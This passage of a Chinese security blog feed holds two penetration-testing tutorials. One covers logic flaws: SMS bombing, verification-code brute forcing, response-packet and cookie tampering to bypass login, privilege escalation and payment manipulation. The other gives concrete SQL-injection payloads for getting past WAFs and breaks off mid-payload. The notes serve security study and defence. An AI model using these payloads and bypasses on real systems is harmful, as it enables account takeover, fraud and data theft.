title="找回密码"></a>找回密码</h2><p><strong>概念</strong>：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全。</p><p>通过验证码找回密码的话，可以分为验证码漏洞的一种。</p><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><p><strong>实现</strong>：通过数据包重放实现。</p><p><strong>原理</strong>：后台未进行相关操作的计数导致数据包重放。</p><h2 id="其他逻辑漏洞"><a href="#其他逻辑漏洞" class="headerlink" title="其他逻辑漏洞"></a>其他逻辑漏洞</h2><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p><strong>概念</strong>：可以通过同时<u>重放大量数据包</u>进行漏洞利用，通常用于突破限量、限额的问题都有奇效。</p><p><strong>原理</strong>：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞。</p><p><strong>漏洞点</strong>：程序中存在限制，可以猜测到后台有判断与修改操作的方法</p><p><strong>修复</strong>：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程</p><p>并不是每个条件竞争都必须修复。</p><h3 id="数据包重放漏洞"><a href="#数据包重放漏洞" class="headerlink" title="数据包重放漏洞"></a>数据包重放漏洞</h3><p><strong>概念</strong>：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等。</p><p><strong>原理</strong>：后台未进行相关操作的计数导致数据包重放。</p><p><strong>漏洞点</strong>：短信验证码、邮件校验、提交订单等功能。</p><p><strong>修复</strong>：（针对短信、邮件）</p><p>构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数，只要某个邮箱或者电话号码次数够了，就不能继续发送了；或者计算两次发送的时间间隔，时间过短就不继续发送了</p><p><strong>通用修复方案</strong>：</p><p>需要建立<strong>token</strong>机制或验证码机制，一次有效。</p><h3 id="参数绑定漏洞"><a href="#参数绑定漏洞" class="headerlink" title="参数绑定漏洞"></a>参数绑定漏洞</h3><p><strong>概念</strong>：通过添加对象字段相关参数进行数据篡改</p><p><strong>原理</strong>：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改。</p><p><strong>漏洞点</strong>：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。</p><p><strong>修复</strong>：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="举例（出现位置）"><a href="#举例（出现位置）" class="headerlink" title="举例（出现位置）"></a>举例（出现位置）</h2><p><strong>逻辑漏洞的问题可以分为前端和后端两个部分，总体思路都是先测试前端再测试后端。</strong></p><h3 id="注册处"><a href="#注册处" class="headerlink" title="注册处"></a>注册处</h3><p>注册功能可能出现任意用户注册、短信轰炸等问题。</p><p>以手机注册为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821141424493.png" alt="image-20220821141424493"></p><h4 id="前端参数验证的漏洞"><a href="#前端参数验证的漏洞" class="headerlink" title="前端参数验证的漏洞"></a>前端参数验证的漏洞</h4><p>注册时BP抓包，查看每个返回包有没有返回手机验证码或者存在true、false之类的判断语句，尝试将false修改为true，成功注册的话就绕过了前端验证。</p><p>拦截返回的响应包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821145657006.png" alt="image-20220821145657006"></p><h4 id="任意用户添加"><a href="#任意用户添加" class="headerlink" title="任意用户添加"></a>任意用户添加</h4><p>在未登录或者低权限的的情况下，利用数据包添加任意用户。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220912152818701.png" alt="image-20220912152818701"></p><h4 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h4><p>尝试重放发送验证码的包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间限制。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821145912458.png" alt="image-20220821145912458"></p><h4 id="修改发送包手机号"><a href="#修改发送包手机号" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821150032637.png" alt="image-20220821150032637"></p><h3 id="登陆处"><a href="#登陆处" class="headerlink" title="登陆处"></a>登陆处</h3><p>登录处可能出现任意用户登录、验证码可绕过、用户账号可撞库等问题。</p><p>以手机验证码登录举例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821160800742.png" alt="image-20220821160800742"></p><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><p>对比正确登录和错误登录的包，对比返回包看是否有判断，尝试修改参数绕过前端验证。</p><h4 id="修改cookie实现垂直越权"><a href="#修改cookie实现垂直越权" class="headerlink" title="修改cookie实现垂直越权"></a>修改cookie实现垂直越权</h4><p>cookie的构造过于简单，可以分析出一部分参数，且通过前端JS文件可以判断出对该参数的校验。</p><p>比如发现前端文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span>) <span class="comment">//login_ok.htm use</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;login=1&quot;</span>;</span><br><span class="line"><span class="title function_">MM_goToURL</span>(<span class="string">&#x27;parent&#x27;</span>, <span class="string">&#x27;home.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么将Cookie中的 login&#x3D;1 则会以管理员身份跳转 home.html，成功绕过登录。</p><h4 id="短信轰炸-1"><a href="#短信轰炸-1" class="headerlink" title="短信轰炸"></a>短信轰炸</h4><p>与注册处测试步骤一样</p><h4 id="验证码爆破-1"><a href="#验证码爆破-1" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>包括图片验证码和手机验证码。</p><p>先测试图片验证码，将使用正确验证码登录的包再重放一次，如果回显还是正确登录的话说明并没有对图片验证码进行限制，可以尝试撞库。</p><p>至于手机验证码，通常是尝试爆破，如果网站发到手机上的短信没有写什么在xx时间内有效之类的则有可能没有时间限制，将登录包右键发送至Intruder（即测试器模块）设置好爆破位置后在载荷里选择数值后这样填写。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821162352786.png" alt="image-20220821162352786"></p><p>通常范围是填写正确验证码所在的范围，爆破出来后就可以登录用户，对应着任意用户登录漏洞。</p><h4 id="修改发送包手机号-1"><a href="#修改发送包手机号-1" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>修改发送包手机号则和上面注册处修改发送包手机号步骤一样，不同的是上面注册处是为了测试任意用户注册，而这里登录处是为了测试任意用户登录，原理一样目的不同。</p><h4 id="修改用户参数"><a href="#修改用户参数" class="headerlink" title="修改用户参数"></a>修改用户参数</h4><p>查看正确登录包的返回包是否有用户id之类的参数，尝试修改该参数。（不嫌麻烦的话可以用两个正确登录的返回包对比）</p><p>拦截该请求的返回包修改返回包中的用户参数。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821162530220.png" alt="image-20220821162530220"></p><h3 id="密码找回处"><a href="#密码找回处" class="headerlink" title="密码找回处"></a>密码找回处</h3><p>密码找回处可能出现任意用户密码找回、验证码可绕过等问题。</p><p>以手机验证码找回为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821160553407.png" alt="image-20220821160553407"></p><h4 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h4><p>同样是修改返回包看是否能跳过验证步骤。</p><h4 id="验证码爆破-2"><a href="#验证码爆破-2" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>验证码爆破与上面登录处的验证码爆破操作一致。</p><h4 id="修改发送包手机号-2"><a href="#修改发送包手机号-2" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>与上面注册处的修改发送包手机号操作一致</p><h2 id="支付与越权"><a href="#支付与越权" class="headerlink" title="支付与越权"></a>支付与越权</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821163341791.png" alt="image-20220821163341791"></p><p>可以使用两个账号来对比测试，这样可以更快发现可疑参数。</p><p>支付接口指的是网站支付一般会有像微信支付、支付宝支付这种，一般网站会在支付的发送包里用某个参数标识。</p><p>登录时查看并测试用户信息返回接口指的是，在登录的时候，有的网站有个返回包是一个json数据包，该包内包含了用户敏感信息，此时就可以尝试修改发送包的用户参数，说不定就能获取其他用户的敏感信息。 </p><h2 id="权限框架缺陷"><a href="#权限框架缺陷" class="headerlink" title="权限框架缺陷"></a>权限框架缺陷</h2><p>权限控制框架是实现权限控制功能的基础（例如shiro），如果权限控制框架本身存在缺陷，那么就会导致权限控制功能完全失效。</p><h2 id="SRC中逻辑漏洞总结"><a href="#SRC中逻辑漏洞总结" class="headerlink" title="SRC中逻辑漏洞总结"></a>SRC中逻辑漏洞总结</h2><ol><li><p>注册：</p><ol><li>短信轰炸</li><li>验证码安全问题</li><li>密码爆破</li><li>邮箱轰炸</li></ol></li><li><p>用户任意注册、批量注册</p></li><li><p>用户名枚举</p></li><li><p>XSS（有框的地方就可以尝试插XSS）</p></li><li><p>登录：</p><ol><li>短信轰炸、验证码安全问题、密码爆破、邮箱轰炸</li><li>SQL注入</li><li>撞库</li><li>抓包把password字段修改为空值发送</li><li>认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号</li><li>Cookie仿冒</li><li>修改返回包的相关数据，可能会登陆到其他的用户</li></ol></li><li><p>找回密码：</p><ol><li>短信邮箱轰炸、短信邮箱劫持</li><li>重置任意用户账户密码、验证码手机用户未统一验证</li><li>直接跳过验证步骤</li></ol></li><li><p>购买支付、充值（要利用抓包去仔细查看每一个可用的参数）</p><ol><li>交易金额、数量修改、更换支付模块（比如更换支付的模块金额）</li><li>交易信息订单编码&#x2F;导致信息泄露</li><li>整数溢出，int最大值为2147483647，超过最大值</li><li>修改充值账户</li><li>支付绕过</li></ol></li><li><p>抽奖活动</p><ol><li>刷奖品、积分</li><li>并发</li></ol></li><li><p>优惠卷、代金卷</p><ol><li>并发逻辑漏洞（burp批量获取优惠券）</li><li>修改优惠券金额、数量</li></ol></li><li><p>订单信息</p><ol><li>订单信息遍历、泄露</li><li>订单信息泄露导致用户信息泄露</li><li>删出他人订单</li></ol></li><li><p>会员系统</p><ol><li>修改个人信息上传文件，上传带弹窗的html</li><li>如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测</li><li>图片上传也可能遇到imagereagick命令执行，上传恶意图片</li><li>视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf</li><li>用户横向越权访问、遍历、导致用户信息泄露</li><li>SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS</li></ol></li><li><p>传输过程</p></li><li><p>明文传输账户密码</p></li><li><p>修改信息处无session&#x2F;token导致csrf</p></li><li><p>POST&#x2F;COOKIE注入</p></li><li><p>评论</p></li><li><p>POST注入</p></li><li><p>存储型XSS</p></li><li><p>无session&#x2F;token导致CSRF</p></li><li><p><strong>验证码问题</strong></p><ol><li>万能验证码</li><li>返回包中存在验证码</li><li>删除验证码或者cookie中的值可以爆破账号密码</li></ol></li><li><p><strong>短信轰炸</strong></p><ol><li>一直重放</li><li>删除修改cookie，重放数据包</li><li>遍历参数发送数据包</li><li>手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包</li><li>请求参数修改大小写，或者添加请求参数比如&amp;id&#x3D;1</li><li>一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口</li><li>如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显</li></ol></li><li><p><strong>水平越权</strong></p><ol><li>主要登陆后还是修改参数，主要找到多个接口不断测试</li><li>关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测</li><li>多个账号，主要分析请求参数</li></ol></li><li><p><strong>数据泄露</strong></p><p>在找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回</p></li><li><p><strong>任意用户密码重置</strong></p><ol><li>目前大部分都是在修改密码处参数修改</li><li>有些是前端验证</li></ol></li></ol><p><strong>支付逻辑漏洞</strong></p><ol><li>边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户</li><li>顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。</li><li>金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包</li><li>确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。</li><li>请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。</li><li>请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。</li><li>订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。</li><li>欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家</li><li>单位替换：产生在paypal类似的国际支付的场景。</li><li>用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西</li><li>强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。</li><li>秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。</li><li>函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。</li><li>heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。</li></ol><p>该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。</p><ol><li><p><strong>修改返回包的越权</strong></p><ol><li>修改手机号</li></ol><p>一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改</p><p>如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过</p><p>比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞</p></li><li><p><strong>登录绕过</strong></p><p>部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号</p></li><li><p><strong>水平越权</strong></p><ol><li><p>遍历ID</p><p>在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题</p></li><li><p>ID替换</p><p>如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题</p></li><li><p>垂直越权</p><p>观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改</p></li></ol></li></ol><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>采用成熟的权限管理框架（如spring security）</p><p><strong>验证用户是否具有操作数据的权限</strong></p><p>用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）<strong>优先采用在服务端关联session或加密后放在session中的方式获取</strong></p><p>应对用户凭证（如用户ID、产品号码、订单流水号等）采用难以猜测的构造方式（如随机数）或采用复杂的加密算法加密后再提交</p><p><strong>对管理功能模块进行严格的权限验证</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞&quot;&gt;&lt;a href=&quot;#逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞&quot;&gt;&lt;/a&gt;逻辑漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://www.freebuf.com/vuls/281141.html&quot;&gt;https://</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-WAF绕过</title>
    <link href="https://frankcao3.github.io/posts/24600"/>
    <id>https://frankcao3.github.io/posts/24600</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.976Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WAF简介"><a href="#WAF简介" class="headerlink" title="WAF简介"></a>WAF简介</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>WAF(Web Application Firewall)的具有以下四个方面的功能：</p><ul><li><p><strong>会话审计</strong></p><p>用来截获所有HTTP数据或者仅仅满足某些规则的会话</p></li><li><p><strong>访问控制</strong></p><p>用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p></li><li><p><strong>架构&#x2F;网络设计</strong></p><p>当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p></li><li><p><strong>WEB应用加固</strong></p><p>这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p></li></ul><p><strong>常用功能包括：</strong></p><p>1.网马木马主动防御及查杀</p><p>2.流量监控</p><p>3.网站漏洞防御</p><p>4.危险组件防御</p><p>5..Net安全保护模块</p><p>6.双层防盗链链接模式</p><p>7.网站特定资源防下载</p><p>8.CC攻击防护</p><p>9.网站流量保护</p><p>10.IP黑白名单</p><h3 id="WAF防护手段"><a href="#WAF防护手段" class="headerlink" title="WAF防护手段"></a>WAF防护手段</h3><p><strong>异常检测机制</strong>：拒绝不符合HTTP标准的请求</p><p><strong>增强的输入验证</strong>：代理和服务端的验证，而不只是限于客户端验证</p><p><strong>白名单&amp;黑名单</strong>：白名单适用于稳定的We应用，黑名单适合处理已知问题</p><p><strong>基于规则和基于异常的保护</strong>：基于规则更多的依赖黑名单机制，基于异常更为灵活</p><p><strong>状态管理</strong>：重点进行会话保护</p><p><strong>信息泄露保护</strong>：防止服务器信息泄露。</p><p>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p><p>如果是对于扫描器，WAF有其识别之道：</p><p><strong>扫描器识别主要由以下几点：</strong></p><ol><li>扫描器指纹(head字段&#x2F;请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识 </li><li>单IP+ cookie某时间段内触发规则次数 </li><li>隐藏的链接标签等() </li><li>Cookie植入 </li><li>验证码验证，扫描器无法自动填充验证码 </li><li>单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</li></ol><h3 id="常见WAF产品"><a href="#常见WAF产品" class="headerlink" title="常见WAF产品"></a>常见WAF产品</h3><ul><li><p><strong>硬件WAF</strong></p><p>如果是串联到链路中，则可以拦截恶意流量，如果是以旁路的形式部署，则只能记录攻击但是不能拦截。硬件型WAF一般而言比软件型WAF更加昂贵，但是检测速度快，不易称为网站瓶颈。</p><p>如绿盟、启明、安恒、创宇、神州数码</p></li><li><p><strong>软件WAF</strong></p><p>安全狗、D盾、云锁、中间件自带的waf</p></li><li><p><strong>云WAF</strong></p><p>阿里云、安全狗、创宇、安恒等</p></li></ul><h2 id="WAF防护绕过"><a href="#WAF防护绕过" class="headerlink" title="WAF防护绕过"></a>WAF防护绕过</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727205214531.png" alt="image-20220727205214531"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>在语句中添加某些特殊符号，并不会影响语句的执行效果。在waf绕过中，检测这些特殊符号干扰了检测机制，从而绕过检测。 </p><h4 id="通过注释符号-x2F-x2F-进行绕过"><a href="#通过注释符号-x2F-x2F-进行绕过" class="headerlink" title="通过注释符号&#x2F;**&#x2F;进行绕过"></a>通过注释符号&#x2F;**&#x2F;进行绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database/**/();</span><br><span class="line">+-------------+</span><br><span class="line">| database () |</span><br><span class="line">+-------------+</span><br><span class="line">| security    |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="通过-0A为换行符；-23为-号；-20为空格实现绕过"><a href="#通过-0A为换行符；-23为-号；-20为空格实现绕过" class="headerlink" title="通过%0A为换行符；%23为#号；%20为空格实现绕过"></a>通过%0A为换行符；%23为#号；%20为空格实现绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=-1 /*%0a*/union/*%0a*/select/*%0a*/1,2,3</span><br><span class="line">相当于</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">1,2,3</span><br><span class="line"></span><br><span class="line">select * from users where id=-1 union%23a%0Aselect 1,2,3%23   // select a union的组合可以将安全狗屏蔽掉</span><br><span class="line">相当于</span><br><span class="line">union #a</span><br><span class="line"></span><br><span class="line">select 1,2,3#</span><br></pre></td></tr></table></figure><h4 id="内联注释绕过-原理"><a href="#内联注释绕过-原理" class="headerlink" title="内联注释绕过/*!*/原理"></a>内联注释绕过<code>/*!*/</code>原理</h4><p><code>/*!*/</code>符号内语句不会注释，可以正常的执行。</p><p><code>/*!select * from users*/</code>的结果如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/973eec3ae8780068054370c04685751813422942.png@527w_419h_progressive.webp" alt="img"></p><ul><li><p><code>/** #*/</code>原理</p><p>比如<code>id=1/**&amp;id=-1 union select 1,2,3#*/</code></p><p>安全狗检测到的：<code>id=1</code>，以为<code>/***/</code>里面是注释不执行</p><p>但是Apache检测到的：<code>-1 union select 1,2,3#*/</code> 会以后一个id值为准</p></li></ul><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><h4 id="大小写-x2F-关键字替换"><a href="#大小写-x2F-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1 UnIoN/**/SeLeCT 1,user()</span><br><span class="line">Hex() bin() 等价于ascii()</span><br><span class="line">Sleep() 等价于 benchmark()</span><br><span class="line">Mid()substring() 等价于 substr()</span><br><span class="line">@@user 等价于 User()</span><br><span class="line">@@Version 等价于 version()</span><br></pre></td></tr></table></figure><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><p>hex,urlcode,base64等</p><p>比如关键字全部被拦截，那么尝试使用URL全编码的方式绕过拦截。由于服务器会自动对URL进行一次URL解码， 所以需要把关键词编码两次，这里需要注意的地方是，URL编码需选择全编码，而不是普通的URL编码。</p><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>GET POST COOKIE等</p><p>POST-&gt;multipart&#x2F;form-data</p><h4 id="中间件HPP参数污染"><a href="#中间件HPP参数污染" class="headerlink" title="中间件HPP参数污染"></a>中间件HPP参数污染</h4><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><p><strong>参数污染源原理</strong></p><p>在HTTP协议中允许同样名称的参数出现多次，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。</p><p>假设这个URL：<code>http://www.xxxx.com/search.php?id=110&amp;id=911</code>，主要有三种情况。</p><p>百度会理解成让百度搜索: 110           # 选择了第一一个参数,放弃了第二个参数。</p><p>雅虎会理解成让雅虎搜索: 911           # 选择了第二个参数,放弃了第一个参数。</p><p>谷歌会理解成让谷歌搜索: 110 911   # 两个参数同时选择。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20210608112521171.png" alt="img"></p><h3 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h3><h4 id="Mysql技巧"><a href="#Mysql技巧" class="headerlink" title="Mysql技巧"></a>Mysql技巧</h4><p>（1）mysql注释符有三种：#、&#x2F;<em>…</em>&#x2F;、–   (注意–后面有一个空格)</p><p>（2）空格符：[0x09, 0x0a-0x0d, 0x20, 0xa0]</p><p>（3）特殊符号：%a 换行符</p><p>  可结合注释符使用%23%0a，%2d%2d%0a。</p><p>（3）内联注释：</p><p>  <code>/*!UnIon12345SelEcT*/ 1,user()</code>  </p><p>  &#x2F;&#x2F;数字范围 1000-50540</p><p>（4）mysql黑魔法</p><p>  <code>select&#123;x username&#125;from&#123;x11 test.admin&#125;;</code></p><h4 id="SQL-Server技巧"><a href="#SQL-Server技巧" class="headerlink" title="SQL Server技巧"></a>SQL Server技巧</h4><p>（1）用来注释掉注射后查询的其余部分：</p><p>  &#x2F;*    C语言风格注释</p><p>  –    SQL注释</p><p>  ; 00％ 空字节</p><p>（2）空白符：[0x01-0x20]</p><p>（3）特殊符号：%3a 冒号</p><p>   id&#x3D;1 union:select 1,2 from:admin</p><p>（4）函数变形：如<code>db_name[空白字符]()</code></p><h4 id="Oracle技巧"><a href="#Oracle技巧" class="headerlink" title="Oracle技巧"></a>Oracle技巧</h4><p>（1）注释符：–、&#x2F;**&#x2F;</p><p>（2）空白字符：[0x00, 0x09, 0x0a-0x0d, 0x20]</p><h4 id="配合FUZZ"><a href="#配合FUZZ" class="headerlink" title="配合FUZZ"></a>配合FUZZ</h4><p>select * from admin where id&#x3D;1【位置一】union【位置二】</p><p>select【位置三】1,2,db_name()【位置四】from【位置五】admin</p><h3 id="逻辑层"><a href="#逻辑层" class="headerlink" title="逻辑层"></a>逻辑层</h3><h4 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h4><p>（1）云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</p><p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</p><p>（3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p><p>（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。</p><p>比如：<code>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</code></p><h4 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h4><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p><p>例子1：</p><p>?id&#x3D;1 and (select 1)&#x3D;(Select 